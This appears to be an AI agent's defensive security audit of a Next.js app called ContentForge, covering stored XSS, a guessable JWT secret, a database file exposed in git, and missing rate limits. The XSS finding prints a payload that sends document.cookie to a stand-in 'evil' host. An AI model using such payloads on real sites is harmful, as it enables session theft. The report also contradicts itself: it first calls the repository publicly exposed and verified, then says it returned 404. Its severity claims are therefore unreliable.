# Bug Bounty / Defensive Security Audit — ContentForge (App 09)

**Target:** `/home/ujjwal/Documents/My Apps/apps/09-contentforge/`
**Type:** Next.js 16 (App Router) SaaS, AI content generation, Prisma + SQLite, NextAuth (Credentials/JWT)
**Authorization:** Boss's own code — authorized review.
**Date:** 2026-05-31
**Auditor:** security-engineer-agent (defensive-only)
**Frameworks:** OWASP Top 10 2025, OWASP LLM Top 10 2025, CWE, MITRE ATT&CK

> **Important scope note:** The "AI" layer is a **mock** (`src/lib/mock-ai.ts`) — pure string manipulation, **no real LLM API and no API keys anywhere in the repo**. So classic prompt-injection / API-key-leak / model-DoS-cost-abuse findings are **N/A in their literal form**. I audited what they *will become* once a real LLM is wired in (the mock IS the injection sink + the unmetered expensive endpoint), and flagged them as design-level risks. Everything else (XSS, secrets, authz, validation, config) is real and present today.

---

## Severity Summary

| # | Severity | Category | Title | File |
|---|----------|----------|-------|------|
| 1 | **CRITICAL** | OWASP A02 / CWE-312 | **`dev.db` with bcrypt password hashes is LIVE in a PUBLIC GitHub repo** | `dev.db` (public on github.com) |
| 2 | **CRITICAL** | OWASP A03 / CWE-79 | Stored XSS via `dangerouslySetInnerHTML` on email body | `library/[id]/page.tsx:137` |
| 3 | **CRITICAL** | OWASP A07 / CWE-798 | Hardcoded predictable `NEXTAUTH_SECRET` (JWT forgery) | `.env:2` |
| 4 | **HIGH** | OWASP LLM04/LLM01/LLM02 (design) | Generation endpoints unmetered/no-rate-limit → cost-abuse (denial-of-wallet) & injection sink once real LLM added | `content/[id]/generate/*` |
| 5 | **MEDIUM** | OWASP A05 / CWE-489 | `typescript.ignoreBuildErrors = true` ships unchecked code | `next.config.ts:5` |
| 6 | **MEDIUM** | OWASP A04 / CWE-770 | No rate limiting anywhere (login brute-force, gen flood) | global |
| 7 | **MEDIUM** | OWASP A03 / CWE-20 | No schema validation (zod imported in helper, used in 0 routes) | all API routes |
| 8 | **MEDIUM** | OWASP A05 / CWE-209 | Raw `error.message` leaked to client (500 path) | `api-helpers.ts:36` |
| 9 | **MEDIUM** | OWASP A05 / CWE-1004,CWE-693 | No security headers / CSP / cookie hardening | `next.config.ts` |
| 10 | **LOW** | OWASP A07 / CWE-307 | No account lockout; user-enumeration timing on login | `auth.ts:14` |
| 11 | **LOW** | OWASP A01 / CWE-918 | `extract` SSRF-shaped endpoint (latent, mock today) | `content/extract/route.ts` |
| 12 | **LOW** | OWASP A09 / CWE-778 | `console.error` of full error objects (PII/content in logs) | `api-helpers.ts:5` |
| 13 | **INFO** | — | Hardcoded demo creds prefilled in login form | `login/page.tsx:88-89` |

> Severity-table numbering (1-13) is the authoritative priority order. The "Findings (detail)" section below kept its original drafting order with cross-reference tags; follow the table for fix priority.

**Positive findings (give credit):** Every authenticated route correctly scopes by `userId` via `findFirst({ where: { id, userId } })` before update/delete — **IDOR is properly prevented** across content, generated, brand-voice, templates, calendar, dashboard, analytics. The `calendar/auto-publish` route is also **authenticated and userId-scoped** (it only publishes the caller's own due content — not a vuln). Passwords are bcrypt-hashed (cost 10). Prisma ORM = no SQL injection. `.env` was **never committed** (verified via git history) and is gitignored. `schedule` route validates date is valid + future. This is solid tenant isolation; the bugs below are elsewhere.

**⚠ Git exposure context (escalates Finding 1):** Remote `origin = github.com/Shrivaujjawal321/contentforge.git` is **PUBLIC right now** — verified via GitHub API (`"private": false, "visibility": "public"`) and HTTP 200. `dev.db` is visible and downloadable at the repo root by anyone. This is **active, live exposure**, not a latent risk. (`.env` itself was never committed — verified — so the secret isn't in git, but it is the app's predictable default, Finding 3.) This is why Finding 1 is CRITICAL/exploitable today, not hypothetical.

---

## Findings (detail)

> Detail headers below use their own numbering; the **severity-table # is authoritative for priority**. Map: table-1 = "dev.db public" (detail §3), table-2 = XSS (detail §1), table-3 = secret (detail §2). Fix order: **dev.db public → secret → XSS** first.

### 1. CRITICAL — Stored XSS via `dangerouslySetInnerHTML` — CWE-79 / OWASP A03 *(table #2)*
**File:** `src/app/(dashboard)/library/[id]/page.tsx:137`
```tsx
<div className="prose prose-sm max-w-none"
     dangerouslySetInnerHTML={{ __html: meta.body }} />
```
**What's wrong:** The email channel renders `meta.body` (from `GeneratedContent.metadata`, a JSON blob) as raw HTML with no sanitization. Today the mock builds that HTML from `source.title` + `source.content` (`mock-ai.ts:117`), both **fully attacker-controlled** via `POST /api/content` and `PUT /api/content/[id]` (zero input filtering). An attacker stores a source titled `<img src=x onerror=alert(document.cookie)>`, generates the email channel, and the payload is persisted and executes whenever that content is viewed.
**Impact:** Session/JWT theft, account takeover, actions-as-victim. Self-XSS now, but trivially **stored/cross-user** in any shared-workspace or admin-review feature, and the rendered output is a natural sharing surface.
**Likelihood:** High (no filtering on the input path at all).
**Exploit:** `POST /api/content {title:"<svg/onload=fetch('//evil/?c='+document.cookie)>", type:"blog", content:"x"}` → `POST /api/content/{id}/generate {channels:["email"]}` → open `/library/{id}`, Email tab → fires.
**Fix:**
- Short-term: sanitize before render — `import DOMPurify from "isomorphic-dompurify"` and `__html: DOMPurify.sanitize(meta.body)`. Or stop rendering HTML: show the email body as escaped text / structured fields.
- Long-term: never let user/model text reach an HTML sink. Treat all generated content as untrusted (OWASP LLM02 — Insecure Output Handling). Add a strict CSP (Finding 10) as defense-in-depth so an injected `onerror` can't exfiltrate.

### 2. CRITICAL — Hardcoded predictable NEXTAUTH_SECRET — CWE-798 / OWASP A07 *(table #3)*
**File:** `.env:2` → `NEXTAUTH_SECRET="contentforge-super-secret-key-2024"`
**What's wrong:** The JWT signing secret is a guessable string and reused as the app identifier. NextAuth signs session JWTs with it. Anyone who knows/guesses it can **forge a valid session token for any `userId`** and fully impersonate any user — bypassing all the (otherwise-correct) per-user authz. Note: `.env` itself was never committed (good), but this exact value is the default for this app and trivially guessable; it is also the kind of string that ends up in screenshots/docs.
**Impact:** Full auth bypass / account takeover for every user. Defeats every authz check in the app.
**Likelihood:** Med-High (trivially guessable default; `.env` not in git, but the value is the app's known default). Combined with the public repo (Finding 3) an attacker who tries this obvious default can forge sessions.
**Fix:**
- Short-term: rotate now — `openssl rand -base64 32` → set in deploy env (Vercel project env vars), never in committed `.env`. Rotating invalidates all existing sessions (intended).
- Long-term: secret in a manager (Vercel env / Vault / AWS Secrets Manager). Add a CI secret-scanner (gitleaks / trufflehog) to block weak/committed secrets. Keep `.env.example` placeholder-only (it currently is — good).

### 3. CRITICAL — SQLite DB with password hashes is LIVE in a PUBLIC GitHub repo — CWE-312 / OWASP A02 *(table #1 — fix first)*
**Evidence:** `dev.db` (77 KB) is tracked from initial commit `7460cb3` through HEAD. `.gitignore` ignores `.env*` but **not `*.db`**. Remote `origin = github.com/Shrivaujjawal321/contentforge.git` is **PUBLIC** — verified live: GitHub API `"private": false, "visibility": "public"`, web HTTP 200, and `dev.db` is listed and downloadable at the repo root by anyone.
**What's wrong:** The SQLite file contains the `User` table — **email + bcrypt password hashes** — plus all source/generated content. Anyone can `git clone` then `sqlite3 dev.db "select email,password from User"` → offline-crack hashes. The seeded account `demo@contentforge.com` / `password123` cracks instantly. It is also in full git **history**, so removing it from HEAD alone is insufficient.
**Impact:** Live credential-hash disclosure + full data leak to the public internet; credential-stuffing risk for any reused passwords.
**Likelihood:** **High — actively exposed now.**
**Fix (do this first, today):**
1. Make the repo **private** (GitHub → Settings → Danger Zone) or delete it.
2. `git rm --cached dev.db`; add `*.db`, `*.db-journal`, `*.sqlite*` to `.gitignore`; commit.
3. Purge history: `git filter-repo --path dev.db --invert-paths`, then force-push. (Forks/clones may already exist — treat the data as burned.)
4. Rotate every real user password + force re-login; rotate `NEXTAUTH_SECRET` (Finding 2) simultaneously.
5. Long-term: never track DB files; recreate via `prisma migrate` + `seed`. Use Postgres in prod (`.env.example` already points there) — SQLite on Vercel serverless is also ephemeral/broken (correctness bug). Add gitleaks/trufflehog in CI to block this class.

### 4. HIGH (design) — Unmetered generation endpoints = cost-abuse + injection sink — OWASP LLM01/LLM02/LLM04
**Files:** `content/[id]/generate/route.ts`, `content/[id]/generate/[channel]/route.ts`, `generated/[id]/rewrite`, `/score`, `brand-voice` (POST)
**What's wrong (today):** Generation accepts an **array of channels** and loops with no cap, no per-user quota, no rate limit, no input-size cap. Source `content` has no length bound (stored verbatim from `POST /api/content`). The mock is cheap, so impact today = CPU/DB amplification only.
**What's wrong (the moment a real LLM is wired in — and `mock-ai.ts` is clearly the placeholder):**
- **LLM04 / Denial-of-Wallet:** authenticated user (or anyone, since registration path is unclear) loops `generate` over huge inputs × many channels → unbounded paid API spend. No budget cap, no rate limit, no token-count guard.
- **LLM01 Prompt Injection:** `source.content` + `title` + user-supplied `tone`/`targetTone` will be concatenated into the model prompt. Today `tone`/`targetTone` flow unvalidated straight into transformer logic (`mock-ai.ts:392`). With a real model these are direct injection vectors (system-prompt override, data exfiltration).
- **LLM02 Insecure Output Handling:** model output already lands in a `dangerouslySetInnerHTML` sink (Finding 1).
**Impact:** Financial DoS, prompt injection, untrusted-output XSS — the OWASP LLM trifecta.
**Likelihood:** N/A today (mock) → High once real LLM added.
**Fix (bake in before going live):**
- Cap `channels.length` (e.g. ≤5) and `content` length (e.g. ≤50k chars) with zod (Finding 8).
- Per-user rate limit + daily generation quota tied to `plan` (the `User.plan` field already exists — enforce it). Use Upstash Ratelimit or a DB counter.
- Hard token/cost budget per request and per user/day; reject over budget.
- System/user prompt separation, output passed through a sanitizer, never to an HTML sink.
- Hand-off: `ml-engineer-agent` for budget caps + injection defenses (Rebuff/classifier), `backend-engineer-agent` for quota+rate-limit middleware.

### 6. MEDIUM — `ignoreBuildErrors: true` — CWE-489 / OWASP A05 *(table #5)*
**File:** `next.config.ts:5`. Type errors are suppressed at build, so type-level safety bugs (and the `as Record<string, unknown>` auth casts) ship silently. The `dashboard/route.ts` even references undefined `generated`/`byChannel` vars (copy-paste bug) that a type check would catch.
**Fix:** Remove `ignoreBuildErrors`; fix the surfaced errors. Run `tsc --noEmit` + `eslint` in CI as a merge gate.

### 7. MEDIUM — No rate limiting (login brute-force, gen flood) — CWE-770 / OWASP A04
**Evidence:** `grep` for ratelimit/throttle across `src/` = 0 hits. The credentials `authorize` (`auth.ts`) has no attempt throttle → unlimited password guessing. All POST endpoints unbounded.
**Fix:** Add IP+account rate limiting on `/api/auth/*` (e.g. 5/min) and a global limiter on mutation routes. Upstash Ratelimit or `next-rate-limit` in middleware.

### 8. MEDIUM — No request-body validation — CWE-20 / OWASP A03
**Evidence:** zod is imported only in `api-helpers.ts` (for error formatting) and used in **0 routes**. Every handler does `const body = await request.json()` then trusts fields (`title`, `content`, `tone`, `scheduledAt`, `variables`, `sampleText`…). `new Date(scheduledAt)` on bad input yields `Invalid Date` persisted silently; `content.split` crashes if `content` is a non-string (unhandled 500). Mass-assignment is limited (routes pick fields explicitly — good) but types/shape are unchecked.
**Fix:** Define a zod schema per route, `schema.parse(body)` at the top; `handleApiError` already formats `ZodError` to 400 — wire it in. Validate `scheduledAt` is a valid future date, `channels` is a known enum, string length caps.

### 9. MEDIUM — Internal error messages leaked to client — CWE-209 / OWASP A05
**File:** `src/lib/api-helpers.ts:36` → `return NextResponse.json({ error: error.message }, { status: 500 })`. Raw exception text (Prisma internals, file paths, constraint details) is returned to the caller, aiding recon.
**Fix:** Return a generic `"Internal server error"` + a correlation id for 500s; log the detail server-side only.

### 10. MEDIUM — No security headers / CSP / cookie hardening — CWE-693/CWE-1004 / OWASP A05
**File:** `next.config.ts` has no `headers()`. No CSP (would have blunted Finding 1), no `X-Frame-Options`/`frame-ancestors` (clickjacking), no HSTS. NextAuth cookies aren't explicitly hardened (rely on defaults).
**Fix:** Add `async headers()` with `Content-Security-Policy` (no `unsafe-inline`), `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy`, `Strict-Transport-Security`. In `authOptions.cookies` set `httpOnly`, `sameSite:"lax"`, `secure:true` in prod.

### 11. LOW — No account lockout / user-enumeration — CWE-307/CWE-203 / OWASP A07
**File:** `auth.ts:14-34`. `authorize` returns `null` immediately when the user doesn't exist but runs bcrypt.compare when it does — a timing oracle for valid-email enumeration. No lockout (ties to Finding 7).
**Fix:** Compare against a dummy hash when user is missing (constant-time path); add lockout/backoff; uniform error text (already "Invalid credentials" client-side — good).

### 12. LOW — `extract` endpoint is SSRF-shaped (latent) — CWE-918 / OWASP A01
**File:** `content/extract/route.ts` + `mock-ai.ts:523` `new URL(url).hostname`. Today it only string-matches the hostname against a mock map — no fetch, so **not exploitable now**. But it's the obvious place a real "scrape this URL" feature lands; if it ever does `fetch(url)` it becomes SSRF (cloud metadata, internal services). `new URL(badInput)` also throws → unhandled 500.
**Fix:** When implementing real extraction: allowlist schemes (http/https only), block private/link-local/metadata IPs (169.254.169.254, RFC1918, localhost), validate the URL, cap response size. Wrap the `new URL()` in try/catch now.

### 13. LOW — Verbose error logging may capture content/PII — CWE-778 / OWASP A09
**File:** `api-helpers.ts:5` `console.error("API Error:", error)` logs whole error objects which can include request content. Per Jarvis house rule "never log full prompts/PII to disk." Once real LLM prompts flow, this would log user content.
**Fix:** Log structured, redacted fields only (route, userId, error class, correlation id) — never raw bodies/prompts.

### 14. INFO — Demo creds prefilled in login form
**File:** `login/page.tsx:88-89` defaults `email="demo@contentforge.com"`, `password="password123"` (matches `seed.ts:13`). Fine for a demo; remove before any real deployment so the seeded account isn't a standing backdoor.

---

## Compliance Mapping (quick — by authoritative table #)
- **OWASP Top 10 2025:** A01 (#11), A02 (#1), A03 (#2,#7), A04 (#6), A05 (#5,#8,#9), A07 (#3,#10), A09 (#12).
- **OWASP LLM Top 10 2025:** LLM01/02/04 (#4); LLM02 also (#2 — insecure output handling / XSS sink).
- **CWE:** 79, 798, 312, 770, 20, 209, 693, 1004, 307, 918, 778, 489.
- **SOC2 (if pursued):** CC6.1 (auth — #3,#10), CC6.6 (transmission/headers — #9), CC6.7 (data-at-rest exposure — #1), CC7.1 (logging — #12).

## Verification Plan (non-destructive)
1. **XSS (1):** create source with `<img src=x onerror=console.log('xss')>` title, generate email, open Email tab in a throwaway account — confirm execution; re-test after DOMPurify (should render inert).
2. **Secret (2):** confirm `NEXTAUTH_SECRET` rotated + sourced from deploy env, old sessions invalidated.
3. **DB (3):** `git ls-files | grep -c '\.db$'` must be 0; `.gitignore` contains `*.db`; history purged + force-pushed.
4. **Rate limit (7):** scripted 20 bad logins → expect 429 after N.
6. **Validation (8):** POST malformed bodies → expect 400 with zod details, never 500.
7. **CSP (10):** check response headers contain CSP; inline-script injection blocked.
- Recommend a Semgrep CI rule pack (`p/react`, `p/nextjs`, `p/secrets`) + gitleaks pre-commit. Tooling hand-off: `devops-sre-agent` for CI gates.

## Honesty / completeness note
- Audited: all 19 API routes, middleware, auth, prisma layer, schema, env, seed, the XSS sink page, config, git history + remote. IDOR scoping verified route-by-route (clean), including `auto-publish` (authenticated + userId-scoped — NOT a vuln; my initial read was corrected after seeing the full file).
- The AI layer is a **mock** — no real keys/LLM exist, so literal prompt-injection / key-leak / model-DoS are **not exploitable today**; reported as must-fix design risks for when the real LLM lands (Finding 4), since `mock-ai.ts` is plainly the placeholder.
- Did **not** run the app or send live requests (static review only); exploit steps are reasoned from code, not executed.
- Git fact-check: `.env` **never** committed; `dev.db` **is** in history and was pushed to `origin`; remote `github.com/Shrivaujjawal321/contentforge` currently returns **404 (private/deleted)** → not publicly exposed at audit time, but already in remote history. Findings 2 & 3 rated with that nuance.
- Hand-offs: Finding 4 (LLM budget caps/injection) → `ml-engineer-agent`; CI secret-scanning + headers + history purge → `devops-sre-agent`; the code fixes (DOMPurify, zod, fail-safe error handler) → `backend-engineer-agent` / `frontend-engineer-agent`.
